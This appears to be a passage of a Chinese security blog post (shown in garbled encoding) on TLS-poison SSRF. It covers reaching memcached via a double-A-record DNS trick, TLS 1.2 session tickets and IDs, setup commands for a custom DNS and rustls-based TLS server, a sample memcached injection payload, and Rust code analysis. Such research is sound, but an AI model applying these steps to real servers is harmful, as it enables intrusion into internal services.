æŒ‡å‡ºæ­¤å¤„é”™è¯¯ï¼ŒåŸæ–‡å·²æ›´æ­£ã€‚</p><p>ä¹‹å‰çš„é”™è¯¯ï¼š</p><p>å¦‚æœå¯¹äºä¸€ä¸ªåŸŸåè¿›è¡Œè¿™æ ·çš„è®¾ç½®ï¼ŒAAAA è®°å½•æŒ‡å‘ ::ffff:127.0.0.1 æˆ–è€… ::1 åœ°å€ä¸Šï¼ŒA è®°å½•æŒ‡å‘ TLS VPS çš„ IPv4 åœ°å€ä¸Šï¼Œè™½ç„¶ä¼¼ä¹å¯ä»¥åšåˆ° curl å› ä¼˜å…ˆ AAAA è®°å½•ä¸ TLS VPS å»ºç«‹è¿æ¥è·å¾—æ¶æ„ Session ID ï¼Œä½†æ˜¯å®é™…æµ‹è¯•é»˜è®¤ memcached é…ç½®ï¼Œæ— æ³•é€šè¿‡è¿™ä¸¤ä¸ª(::ffff:127.0.0.1 æˆ–è€… ::1)åœ°å€è¿›è¡Œå†™å…¥ memcached ã€‚</p><p>æ›´æ­£ï¼šcurl ä»¥ ::1 ä¼˜å…ˆï¼Œè€Œä¸”åŸæ¥çš„è¯­åºäº§ç”Ÿäº†é”™è¯¯ã€‚ä»¥åŠ Memcached å®é™…ä¸Šæ˜¯æ¥å—ä» ::ffff:127.0.0.1 æˆ–è€… ::1 å†™å…¥çš„ï¼Œè¯¦è§ <a href="#IPv4-Mapped-With-Memcached">Additional Remarks</a></p></blockquote><p>è™½ç„¶æœ‰äº›é—æ†¾æ— æ³•å¤ç° @zhaojin æ‰€è¯´çš„è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘è§‰å¾—æ˜¯ä¸ªå¾ˆæœ‰è¶£çš„æƒ³æ³•ï¼Œä»¥åŠ @Ivan Komarov æåˆ° DNS å¯¹äºä¸€ä¸ªåŸŸåå¯ä»¥è¿”å›åŒ A è®°å½•ï¼Œä¹Ÿèƒ½æœ‰ç±»ä¼¼çš„æ•ˆæœï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·è¿›è¡Œå°è¯•ï¼š</p><ul><li>é¦–å…ˆï¼Œé»˜è®¤é…ç½®ä¸‹ï¼Œ æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ 0.0.0.0:11211 è¿™ä¸ªåœ°å€ä¸ memcached é€šä¿¡</li><li>å¯¹äºè¿”å›çš„åŒ A è®°å½•ï¼Œä¸€ä¸ªé…ç½®ä¸º TLS VPS IP ï¼Œå¦ä¸€ä¸ªä¸º 0.0.0.0 ï¼Œcurl æ¯æ¬¡éƒ½ä¼šä¼˜å…ˆä½¿ç”¨ TLS VPS IP ï¼Œå¦‚æœä¸èƒ½é€šä¿¡æ‰ä¼šæ¥ç€ä½¿ç”¨ 0.0.0.0:11211</li></ul><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/4.png" alt=""></p><p>é‚£æ ¹æ®å·²çŸ¥ä¿¡æ¯ï¼Œé‚£ä¹ˆä¸ä¸Šæ–‡çš„åšæ³•ç±»ä¼¼ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥è®© curl ç¬¬ä¸€æ¬¡å»ºç«‹é“¾æ¥ï¼Œæ‹¿åˆ°æˆ‘ä»¬åˆ†é…çš„ payload åï¼Œæ–­å¼€è¿æ¥ï¼Œè®©å…¶ç¬¬äºŒæ¬¡è¿æ¥ä¸é€šè€Œå»é€‰æ‹©å¦å¤–ä¸€ä¸ª IP å‘¢ï¼Ÿ</p><p>äº‹å®è¯´æ˜ï¼Œæˆ‘ä»¬ä¹Ÿç¡®å®å¯ä»¥è¿™ä¹ˆåšã€‚åŸºäº @Ivan Komarov æä¾›çš„ DNS Server ä»¥åŠ @zhaojin ä½¿ç”¨çš„ proxy.py ï¼Œæˆ‘ä»¬å¯ä»¥æ‹‰å–æˆ‘æ•´ç†çš„ä»“åº“ <a href="https://github.com/ZeddYu/TLS-poison" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison</a> è¿›è¡Œå®éªŒã€‚</p><p>è¿™é‡Œ DNS VPS çš„ setup æˆ‘ä»¬éœ€è¦ä½¿ç”¨ client-hello-poisoning/new-custom-dns/alternate-dns.py è¿›è¡Œæˆ‘ä»¬åŸŸåçš„è§£æï¼š</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">alternate-dns</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">tls</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">--ip</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">--mode</span> <span class="hljs-selector-tag">static_zero</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>x.x.x.x ä¸ºä½  TLS Server IP ï¼Œmode æœ‰ä¸¤ç§ï¼Œ<code>rebinding</code>æ¨¡å¼åˆ™ä¸ºæ™®é€šçš„é‡ç»‘å®šè§£ææ¨¡å¼ï¼Œ<code>static_zero</code>åˆ™æ˜¯æˆ‘ä»¬è¿™æ¬¡æµ‹è¯•çš„åŒ A è®°å½•ã€‚</p><p>TLS VPS çš„ setup è¿˜æ˜¯ä¸ä¹‹å‰ä¸€æ ·ï¼Œåªä¸è¿‡è¿™æ¬¡æˆ‘ä»¬éœ€è¦æŠŠ TLS Server çš„ç«¯å£ç»‘å®šåœ¨ 11210 ä¸Šï¼Œä½¿ç”¨ proxy.py å°† 11211 çš„æµé‡è½¬å‘åˆ° TLS Server ä¸Šï¼Œè€Œä¸”è¯¥è½¬å‘åªè½¬å‘ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆ curl ç¬¬äºŒæ¬¡è¿æ¥å¤±è´¥ï¼Œä¹Ÿå°±èƒ½è®©å…¶åˆ‡æ¢åˆ°å¦ä¸€ä¸ª IP è¿›è¡Œè¿æ¥äº†ã€‚</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11210 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/root/tls/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/root/tls/privkey.pem</span> http</span><br></pre></td></tr></tbody></table></figure><p></p><p>Ok. Letâ€™s have a try.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/5.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œ curl ä¸éœ€è¦å†ç»è¿‡å¤šæ¬¡é‡å®šå‘ï¼Œåªéœ€è¦ä¸€æ¬¡é‡å®šå‘å°±å¯ä»¥ç¨³å®šè¿›è¡Œ SSRF ï¼Œä¹Ÿä¸å†éœ€è¦ä¾é  DNS Rebinding çš„ç¨³å®šæ€§äº†ã€‚</p><h3 id="Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-Ticket"><a href="#Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-Ticket" class="headerlink" title="Use The Optimization Method To Deal With TLS 1.2 Session Ticket"></a>Use The Optimization Method To Deal With TLS 1.2 Session Ticket</h3><p>å°½ç®¡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ TLS 1.3 PSK è¿›è¡Œ Session Resumption ï¼Œä½†æ˜¯æ ¹æ® <a href="https://caniuse.com/?search=tls%201.3" target="_blank" rel="noopener">https://caniuse.com/?search=tls%201.3</a> çš„æ•°æ®æ˜¾ç¤ºï¼Œç›®å‰ TLS 1.3 å…¨çƒè¦†ç›–ç‡ä¸º 91.12% ï¼Œè€Œ TLS 1.2 çš„è¦†ç›–ç‡ä¸º 98.4% ï¼Œå¹¶ä¸”ç›®å‰æ·˜å®ã€ç™¾åº¦ç­‰çŸ¥åä¸»ç«™å‡è¿˜æ²¡æœ‰å®Œå…¨æ”¯æŒ TLS 1.3 ï¼Œæ‰€ä»¥æœ‰äº›æ—¶å€™è¿˜æ˜¯éœ€è¦æˆ‘ä»¬ä½¿ç”¨TLS 1.2 ï¼Œè€Œä½œè€…åˆå·äº†ä¸€ç‚¹æ‡’ï¼Œæ²¡æœ‰å®ç°ä»»ä½• TLS 1.2 ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ï¼Œè€Œ @zhaojin ä½¿ç”¨çš„ <a href="https://github.com/tlsfuzzer/tlslite-ng" target="_blank" rel="noopener">tlslite-ng</a> ç›®å‰è¿˜å¹¶æœªæ”¯æŒ TLS 1.2 å½“ä¸­çš„ Session Ticket ï¼Œè€Œåˆæ­£å¥½ä½œè€…ä¿®æ”¹çš„ <a href="https://github.com/ctz/rustls" target="_blank" rel="noopener">rustls</a> å®ç°çš„åŠŸèƒ½æ¯”è¾ƒå®Œå–„ï¼Œæ‰€ä»¥æˆ‘åªèƒ½ç¡¬å¤´çš®åˆšäº†ä¸€æ³¢ rust ï¼Œä¸ºåŸä½œè€…çš„ TLSServer å¢åŠ äº†åŸºäº TLS 1.2 Session Ticket çš„ä¿®æ”¹åŠŸèƒ½ã€‚</p><p>ä¾æ—§ä½¿ç”¨æˆ‘ä¿®æ”¹çš„ä»“åº“ <a href="https://github.com/ZeddYu/TLS-poison" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison</a> ï¼Œå¯¹äº DNS Server setup è¿˜æ˜¯ä½¿ç”¨ä¼˜åŒ–çš„åŒ A è®°å½•çš„æ–¹æ³•ï¼Œä½†æ˜¯å¯¹äº TLS Server setup æˆ‘ä»¬éœ€è¦æ”¹å˜ä¸€ä¸‹ï¼š</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11210 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/root/tls/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/root/tls/privkey.pem</span> <span class="hljs-params">--tickets</span> <span class="hljs-params">--protover</span> 1.2 http</span><br></pre></td></tr></tbody></table></figure><p></p><p>ä½¿ç”¨å‚æ•°<code>--tickets</code>ï¼Œå…è®¸ TLS Server ä½¿ç”¨ Session Tickets è¿›è¡Œ Session Resumption ï¼›ä½¿ç”¨<code>--protover 1.2</code>å‚æ•°ï¼Œåªå…è®¸ TLS Server æœ€é«˜ä½¿ç”¨ TLS 1.2 ç‰ˆæœ¬ã€‚å¹¶åœ¨ redis è®¾ç½® ticket_payload ï¼Œè¿™ä¸ªä¸ä¹‹å‰è®¾ç½®çš„ payload å€¼ä¸€æ ·ï¼Œæ˜¯ç”¨æ¥å¯¹ memcached è¿›è¡Œåˆ©ç”¨çš„ï¼Œæˆ‘ä»¬è¿™é‡Œå°±åŒºåˆ«äºä¹‹å‰éšä¾¿è®¾ç½®ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œä¾‹å¦‚<code>set ticket_payload "\r\nset foo 0 0 41\nThis is a TLS 1.2 session ticket example.\r\n"</code></p><p>å¯¹äº Client ï¼Œæˆ‘ä»¬ä¸èƒ½å†ä½¿ç”¨ curl ï¼Œå› ä¸ºå…¶å¹¶æ²¡æœ‰å®ç° Ticket Session æ’ä»¶â€¦æ‰€ä»¥æˆ‘é€‰ç”¨äº†è€ç‰ˆæœ¬ Chrome 70.0.3538.77 for Ubuntu è¿›è¡Œå­¦ä¹ ã€‚ï¼ˆæé†’è¿™é‡Œä¸è¦ç”¨ Firefox ï¼Œå› ä¸ºä½œè€…åœ¨ PDF ä¸­è¡¨ç¤ºè¿‡ Firefox æ²¡æœ‰è¿™ä¸ªâ€œç‰¹æ€§â€ï¼‰</p><p>ä¾æ—§åœ¨ TLS Server ä¸Šä½¿ç”¨ proxy.py ï¼Œæ¥ç€ç¡®å®šå‡†å¤‡å¥½å°±å¯ä»¥åœ¨æœ¬åœ°æ‰“å¼€ chrome è®¿é—®è‡ªå·± TLS Server çš„åœ°å€ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/6.png" alt=""></p><p>å› ä¸º Chrome çš„ä¸€ä¸ªç‰¹æ®Šæœºåˆ¶ï¼Œä½¿ç”¨ Chrome æµ‹è¯•æˆ‘ä»¬å¹¶ä¸èƒ½åƒ curl é‚£æ ·ä¸€æ¬¡å°±èƒ½æˆåŠŸï¼Œè¿™é‡Œæˆ‘ä»¬æœ€å¥½ä½¿æŠŠ Chrome çš„ Keep local data only until you quit your browser é€‰é¡¹æ‰“å¼€ä»¥åŠè®¾ç½®æ¯æ¬¡æ‰“å¼€ Chrome æ—¶å°±æ‰“å¼€æˆ‘ä»¬çš„ TLS Server åœ°å€ï¼Œè¿™æ ·å®éªŒå°±æ¯”è¾ƒæ–¹ä¾¿äº†ï¼Œå¤šè¯•å‡ æ¬¡æˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ä¸Šå›¾è¿™ä¸ªæ•ˆæœã€‚</p><h3 id="Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-ID"><a href="#Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-ID" class="headerlink" title="Use The Optimization Method To Deal With TLS 1.2 Session ID"></a>Use The Optimization Method To Deal With TLS 1.2 Session ID</h3><p>é‚£è¦æ˜¯é‡åˆ°åªèƒ½ç”¨ curl/libcurl ï¼Œè€Œä¸” TLS 1.3 åˆä¸æ”¯æŒçš„æƒ…å†µï¼Œé‚£å°±åªèƒ½é€šè¿‡ TLS 1.2 Session ID æ¥å®ç°æˆ‘ä»¬æ³¨å…¥ payload å®ç° SSRF äº†ï¼Œæˆ‘ä»¬èƒ½åšçš„å°±æ˜¯ä½¿ç”¨åŒ A è®°å½•çš„æ–¹æ³•æ¥æé«˜æ”»å‡»ç¨³å®šæ€§ã€‚</p><p>ç”±äºä½œè€…å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œå¹¶æ²¡æœ‰å¯¹ TLS 1.2 è¿›è¡Œé€‚é…ï¼Œè€Œæˆ‘ä¹Ÿå¹¶ä¸ç†Ÿæ‚‰ rust ï¼Œåªèƒ½å‹‰å¼ºæ‰¾åˆ°ä½œè€…ä»£ç åº“çš„é—®é¢˜ï¼Œå¤§æ¦‚å°±æ˜¯ç”±äºä½œè€…åœ¨ main.rs#730 å¾ªç¯ä¸­æ¯æ¬¡éƒ½ä½¿ç”¨äº†æ–°çš„ config ï¼Œå¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">loop</span> {</span><br><span class="line">  poll.poll(&amp;<span class="hljs-keyword">mut</span> events, <span class="hljs-literal">None</span>)</span><br><span class="line">  .unwrap();</span><br><span class="line"></span><br><span class="line">  config = make_config(&amp;args, session_id_generator.clone());</span><br><span class="line">  tlsserv.tls_config = config;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> events.iter() {</span><br><span class="line">    <span class="hljs-keyword">match</span> event.token() {</span><br><span class="line">      LISTENER =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> !tlsserv.accept(&amp;<span class="hljs-keyword">mut</span> poll) {</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      _ =&gt; tlsserv.conn_event(&amp;<span class="hljs-keyword">mut</span> poll, &amp;event)</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>å¯¼è‡´äº†åœ¨ rustls/src/server/hs.rs#718 ä¸­æ¯æ¬¡æ ¹æ®<code>client_hello.session_id.get_encoding()</code>éƒ½å–ä¸åˆ°å­˜å‚¨çš„ Session ID</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Perhaps resume?  If we received a ticket, the sessionid</span></span><br><span class="line"><span class="hljs-comment">// does not correspond to a real session.</span></span><br><span class="line"><span class="hljs-keyword">if</span> !client_hello.session_id.is_empty() &amp;&amp; !ticket_received {</span><br><span class="line">  <span class="hljs-keyword">let</span> maybe_resume = sess.config.session_storage</span><br><span class="line">  .get(&amp;client_hello.session_id.get_encoding())</span><br><span class="line">  .and_then(|x| persist::ServerSessionValue::read_bytes(&amp;x));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> can_resume(sess, &amp;<span class="hljs-keyword">self</span>.handshake, 